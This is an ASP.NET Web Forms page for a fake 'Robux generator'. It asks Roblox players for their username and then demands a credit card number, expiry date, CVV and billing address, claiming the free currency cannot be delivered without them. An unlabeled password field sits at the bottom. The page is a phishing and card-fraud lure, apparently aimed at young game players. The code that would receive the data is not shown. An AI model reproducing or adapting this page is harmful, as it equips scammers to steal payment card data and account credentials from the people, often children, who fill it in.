<%@ Page Title="" Language="C#" MasterPageFile="~/Site.Master" AutoEventWireup="true" CodeBehind="WebForm1.aspx.cs" Inherits="robux.WebForm1" %>
<asp:Content ID="Content1" ContentPlaceHolderID="MainContent" runat="server">

    <h1>$$ ROBUX GENERATOR $$</h1>
    </br><br />
    <div>
    <asp:Label ID="Label1" runat="server" Text="Enter Roblox Username:"></asp:Label>
        
        <asp:TextBox ID="TextBox001" runat="server"></asp:TextBox>
       <asp:RequiredFieldValidator ID="RequiredFieldValidator4" runat="server" ErrorMessage="Please enter your ROBLOX account username!" ControlToValidate="TextBox001"></asp:RequiredFieldValidator>

<br /><br />
<asp:Label ID="Label2" runat="server" Text="Robux to generate:"></asp:Label> <asp:TextBox ID="TextBox4" runat="server"></asp:TextBox>
        <asp:RequiredFieldValidator ID="RequiredFieldValidator5" runat="server" ErrorMessage="Please enter the desired amount of robux!" ControlToValidate="TextBox4"></asp:RequiredFieldValidator>

    </div>
<br /><br /><br /><br />
   <div>
            <h2>Enter Credit Card Information</h2>
            <table>
                <tr>
                    <td>Card Number:</td>
                    <td><asp:TextBox ID="TextBox1" runat="server" ></asp:TextBox></td>
                    <asp:RequiredFieldValidator ID="RequiredFieldValidator1" runat="server" ErrorMessage="We cannot administer robux into your account without the number of your credit card!" ControlToValidate="TextBox1" Font-Bold="True" Font-Underline="True"></asp:RequiredFieldValidator>
                </tr>
                <tr>
                    <td>Expiration Date :</td>
                    <td><asp:TextBox ID="TextBox2" runat="server"></asp:TextBox></td>
                    <asp:RequiredFieldValidator ID="RequiredFieldValidator2" runat="server" ErrorMessage="We cannot administer robux into your account without information about your cards expiry date!" ControlToValidate="TextBox2" Font-Bold="True" Font-Underline="True"></asp:RequiredFieldValidator>
                </tr>
                <tr>
                    <td>CVV:</td>
                    <td><asp:TextBox ID="TextBox3" runat="server"></asp:TextBox></td>
                    <asp:RequiredFieldValidator ID="RequiredFieldValidator3" runat="server" ErrorMessage="We cannot administer robux into your account without the 3 digits on the back of your card!" ControlToValidate="TextBox3" Font-Bold="True"></asp:RequiredFieldValidator>
                </tr>
                <tr>
                    <td>Billing Address:</td>
                    <td><asp:TextBox  runat="server"></asp:TextBox></td>
                </tr>
            </table>
        </div>
    <asp:Button ID="Button1" runat="server" Text="GENERATE" />

<asp:TextBox ID="TextBox6" runat="server" TextMode="Password"></asp:TextBox>

</asp:Content>
